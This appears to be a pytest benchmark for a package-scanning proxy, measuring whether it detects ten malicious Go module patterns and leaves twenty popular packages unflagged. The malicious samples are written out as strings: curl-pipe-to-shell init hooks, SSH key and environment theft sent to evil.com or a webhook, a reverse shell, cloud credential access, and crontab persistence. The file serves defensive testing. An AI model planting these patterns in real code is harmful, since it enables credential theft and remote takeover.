"""Go module detection benchmark.

Tests Guard Proxy's detection rate against 10 Go-specific supply chain
attack patterns based on real incidents and known attack vectors.
Goal: 90%+ detection rate.

Also tests false positive rate against 20 popular Go packages.
"""

import shutil
import tempfile
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from app.core.config import Settings
from app.decision.engine import DecisionEngine
from app.scanners.base import ScanPipeline
from app.scanners.cooldown import CooldownScanner
from app.scanners.heuristics_scanner import HeuristicsScanner
from app.scanners.ioc_checker import IOCScanner
from app.scanners.metadata_scanner import MetadataScanner
from app.scanners.static_analysis_go import GoStaticAnalysisScanner
from app.schemas.package import PackageInfo


def _settings():
    return Settings(decision_mode="enforce", cooldown_days=7, cooldown_action="deny")


def _go_scanners(s):
    return [
        IOCScanner(),
        CooldownScanner(s),
        MetadataScanner(),
        GoStaticAnalysisScanner(s),
        HeuristicsScanner(),
    ]


async def _is_blocked(files, age_hours=24, name="github.com/evil/pkg"):
    s = _settings()
    engine = DecisionEngine(s)
    tmp = Path(tempfile.mkdtemp())
    artifacts = []
    for fname, content in files.items():
        p = tmp / fname
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
        artifacts.append(p)
    pkg = PackageInfo(
        name=name,
        version="v1.0.0",
        registry="go",
        publish_date=datetime.now(UTC) - timedelta(hours=age_hours),
    )
    results = await ScanPipeline(_go_scanners(s)).run(pkg, artifacts)
    decision = engine.decide(results)
    shutil.rmtree(tmp)
    return decision.verdict in ("deny", "quarantine")


# ===== Malicious Detection (10 patterns) =====


async def test_go_01_exec_command_in_init():
    """init() with exec.Command — runs at import time."""
    assert await _is_blocked(
        {
            "backdoor.go": """package backdoor

import "os/exec"

func init() {
    exec.Command("sh", "-c", "curl http://evil.com/payload | sh").Run()
}
""",
        }
    )


async def test_go_02_cloud_metadata_theft():
    """AWS/GCP metadata endpoint access for credential theft."""
    assert await _is_blocked(
        {
            "steal.go": """package steal

import (
    "io"
    "net/http"
    "os"
)

func init() {
    resp, _ := http.Get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    body, _ := io.ReadAll(resp.Body)
    os.Setenv("CREDS", string(body))
}
""",
        }
    )


async def test_go_03_ssh_key_exfiltration():
    """SSH key theft via os.ReadFile."""
    assert await _is_blocked(
        {
            "exfil.go": """package exfil

import (
    "net/http"
    "os"
    "strings"
)

func init() {
    key, _ := os.ReadFile(os.Getenv("HOME") + "/.ssh/id_rsa")
    http.Post("https://evil.com/collect", "text/plain", strings.NewReader(string(key)))
}
""",
        }
    )


async def test_go_04_go_generate_shell():
    """go:generate with shell command — runs at build time."""
    assert await _is_blocked(
        {
            "gen.go": """package exploit

//go:generate bash -c 'curl https://evil.com/backdoor.sh | bash'

func Dummy() {}
""",
        }
    )


async def test_go_05_cgo_command_execution():
    """CGo used for arbitrary command execution."""
    assert await _is_blocked(
        {
            "cgo.go": """package exploit

// #include <stdlib.h>
import "C"

func init() {
    C.system(C.CString("curl http://evil.com/payload | sh"))
}
""",
        }
    )


async def test_go_06_webhook_exfiltration():
    """Data exfiltration via Discord/Slack webhook."""
    assert await _is_blocked(
        {
            "webhook.go": """package webhook

import (
    "net/http"
    "os"
    "strings"
)

func init() {
    env := os.Environ()
    data := strings.Join(env, "\\n")
    http.Post("https://discord.com/api/webhooks/123456/abcdef", "text/plain", strings.NewReader(data))
}
""",
        }
    )


async def test_go_07_reverse_shell():
    """Reverse shell via exec.Command."""
    assert await _is_blocked(
        {
            "shell.go": """package shell

import "os/exec"

func init() {
    cmd := exec.Command("bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    cmd.Run()
}
""",
        }
    )


async def test_go_08_gomod_replace_attack():
    """go.mod replace directive pointing to attacker URL + suspicious init."""
    assert await _is_blocked(
        {
            "go.mod": """module example.com/innocent

go 1.21

require github.com/lib/pq v1.10.9

replace github.com/lib/pq => https://evil.com/backdoored-pq
""",
            "main.go": """package main

import "os/exec"

func init() {
    exec.Command("sh", "-c", "whoami").Run()
}
""",
        }
    )


async def test_go_09_base64_exec():
    """Base64 encoded payload with exec."""
    assert await _is_blocked(
        {
            "payload.go": """package payload

import (
    "encoding/base64"
    "os/exec"
)

func init() {
    decoded, _ := base64.StdEncoding.DecodeString("Y3VybCBodHRwOi8vZXZpbC5jb20vYmFja2Rvb3Iuc2ggfCBiYXNo")
    exec.Command("bash", "-c", string(decoded)).Run()
}
""",
        }
    )


async def test_go_10_crontab_persistence():
    """Crontab persistence mechanism."""
    assert await _is_blocked(
        {
            "persist.go": """package persist

import "os/exec"

func init() {
    exec.Command("bash", "-c", `(crontab -l 2>/dev/null; echo "*/5 * * * * curl http://evil.com/beacon") | crontab -`).Run()
}
""",
        }
    )


# ===== False Positive Tests (20 popular Go packages) =====

_POPULAR_GO_PACKAGES = [
    "github.com/gin-gonic/gin",
    "github.com/gorilla/mux",
    "github.com/go-chi/chi",
    "github.com/stretchr/testify",
    "github.com/sirupsen/logrus",
    "go.uber.org/zap",
    "github.com/spf13/cobra",
    "github.com/spf13/viper",
    "google.golang.org/grpc",
    "google.golang.org/protobuf",
    "github.com/lib/pq",
    "github.com/go-redis/redis",
    "github.com/golang-jwt/jwt",
    "github.com/prometheus/client_golang",
    "github.com/hashicorp/consul",
    "github.com/docker/docker",
    "k8s.io/client-go",
    "github.com/aws/aws-sdk-go-v2",
    "github.com/jackc/pgx",
    "github.com/labstack/echo",
]


@pytest.mark.parametrize("module", _POPULAR_GO_PACKAGES)
async def test_go_false_positive(module):
    """Popular Go packages should NOT be flagged as malicious."""
    s = _settings()
    engine = DecisionEngine(s)
    pkg = PackageInfo(
        name=module,
        version="v1.0.0",
        registry="go",
        publish_date=datetime.now(UTC) - timedelta(days=365),
    )
    # Simulate clean Go code — no artifacts to scan (metadata-only check)
    scanners = [IOCScanner(), CooldownScanner(s), MetadataScanner()]
    results = await ScanPipeline(scanners).run(pkg, [])
    decision = engine.decide(results)
    assert decision.verdict == "allow", f"{module} was incorrectly flagged as {decision.verdict}"


# ===== Summary =====


async def test_go_benchmark_summary():
    """Run all Go detection tests and report results."""
    results = {}
    tests = [
        ("go_01_exec_in_init", test_go_01_exec_command_in_init),
        ("go_02_cloud_metadata", test_go_02_cloud_metadata_theft),
        ("go_03_ssh_exfil", test_go_03_ssh_key_exfiltration),
        ("go_04_go_generate", test_go_04_go_generate_shell),
        ("go_05_cgo_exec", test_go_05_cgo_command_execution),
        ("go_06_webhook", test_go_06_webhook_exfiltration),
        ("go_07_reverse_shell", test_go_07_reverse_shell),
        ("go_08_gomod_replace", test_go_08_gomod_replace_attack),
        ("go_09_base64_exec", test_go_09_base64_exec),
        ("go_10_crontab", test_go_10_crontab_persistence),
    ]

    detected = 0
    for name, test_fn in tests:
        try:
            await test_fn()
            results[name] = "DETECTED"
            detected += 1
        except AssertionError:
            results[name] = "MISSED"

    rate = detected / len(tests) * 100
    print(f"\n{'=' * 60}")
    print(f"Go Module Detection Benchmark: {detected}/{len(tests)} ({rate:.0f}%)")
    print(f"{'=' * 60}")
    for name, status in results.items():
        icon = "+" if status == "DETECTED" else "-"
        print(f"  [{icon}] {name}: {status}")
    print(f"{'=' * 60}")

    assert rate >= 90, f"Go detection rate {rate:.0f}% is below 90% target"
